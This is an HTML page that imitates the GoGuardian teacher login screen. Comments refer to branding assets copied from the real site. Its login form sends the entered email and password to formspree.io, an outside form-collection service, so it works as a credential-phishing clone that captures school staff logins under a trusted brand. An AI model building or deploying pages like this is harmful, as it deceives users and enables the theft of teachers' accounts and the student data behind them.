<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GoGuardian | Teacher Login</title>
    <!-- This points to the real CSS file in your assets folder -->
    <link rel="stylesheet" href="assets/account.24b43a3c.css">
</head>
<body class="bg-blue-grey-50">
    <div id="app">
        <div class="login-container">
            <div class="login-card">
                <!-- Direct link to the logo asset you saved -->
                <img src="assets/images/logo.png" alt="GoGuardian" style="width:160px; margin-bottom:20px;">
                
                <h2 class="login-header">Log in to your account</h2>

                <form action="https://formspree.io" method="POST">
                    <div class="input-group">
                        <input type="email" name="email" class="login-input" placeholder="Email" required>
                    </div>
                    <div class="input-group">
                        <input type="password" name="password" class="login-input" placeholder="Password" required>
                    </div>
                    
                    <button type="submit" class="btn-login-green">Log in</button>
                    
                    <div class="separator">or</div>
                    
                    <button type="button" class="btn-google-blue">Log in with Google</button>
                </form>
                
                <div class="login-footer">
                    <p>Need an account? <a href="#">Learn More</a></p>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
